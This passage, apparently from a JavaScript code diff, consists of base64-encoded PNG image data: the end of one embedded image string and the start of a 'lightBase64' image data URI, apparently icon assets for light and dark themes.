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"; 
+  
+    const lightBase64 = "data:image/png;base64,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